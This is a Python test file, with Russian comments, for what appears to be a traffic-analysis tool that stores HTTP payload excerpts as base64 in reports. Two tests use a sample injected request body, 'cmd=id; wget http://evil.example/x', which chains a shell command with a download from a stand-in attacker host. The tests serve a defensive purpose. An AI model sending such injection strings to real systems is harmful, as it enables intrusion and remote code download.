"""Выдержка тела payload'а: base64 в отчёте, байты — в памяти."""
import json

from paradox.config import Config
from paradox.http_object import HttpObject
from paradox.payload_excerpt import decode_sample, is_text, make_sample


def _obj(**kwargs):
    return HttpObject(
        kind=kwargs.get("kind", "request"),
        method=kwargs.get("method", "POST"),
        uri=kwargs.get("uri", "/api"),
        headers=kwargs.get(
            "headers",
            {
                "host": "victim.local",
                "content-type": "text/plain; charset=utf-8",
            },
        ),
        body=kwargs.get("body", b""),
    )


def test_sample_roundtrip_keeps_metadata():
    body = b"cmd=id; wget http://evil.example/x"
    sample = make_sample(
        body, obj=_obj(), direction="request", config=Config(),
    )

    assert decode_sample(sample) == body
    assert sample["direction"] == "request"
    assert sample["method"] == "POST"
    assert sample["host"] == "victim.local"
    assert sample["uri"] == "/api"
    assert sample["content_type"] == "text/plain"
    assert sample["size"] == len(body)
    assert sample["truncated"] is False
    assert sample["is_text"] is True
    assert len(sample["sha256"]) == 64


def test_sample_is_base64_on_disk():
    """В JSON отчёта не должно быть цельного текста payload'а."""
    body = b"cmd=id; wget http://evil.example/x"
    sample = make_sample(body, obj=_obj(), direction="request", config=Config())

    dumped = json.dumps(sample)
    assert "wget http" not in dumped
    assert decode_sample(sample) == body


def test_sample_is_truncated_by_config():
    body = b"a" * 100
    sample = make_sample(
        body,
        obj=_obj(),
        direction="request",
        config=Config(payload_excerpt_bytes=16),
    )

    assert sample["truncated"] is True
    assert sample["size"] == 100
    assert decode_sample(sample) == b"a" * 16


def test_empty_body_has_no_sample():
    assert make_sample(b"", obj=_obj(), direction="request",
                       config=Config()) is None


def test_is_text_distinguishes_binary():
    assert is_text(b"GET / HTTP/1.1\r\n\r\n")
    assert not is_text(bytes(range(256)))


def test_decode_sample_survives_broken_base64():
    assert decode_sample({"text_b64": "not base64!"}) == b""
    assert decode_sample({}) == b""
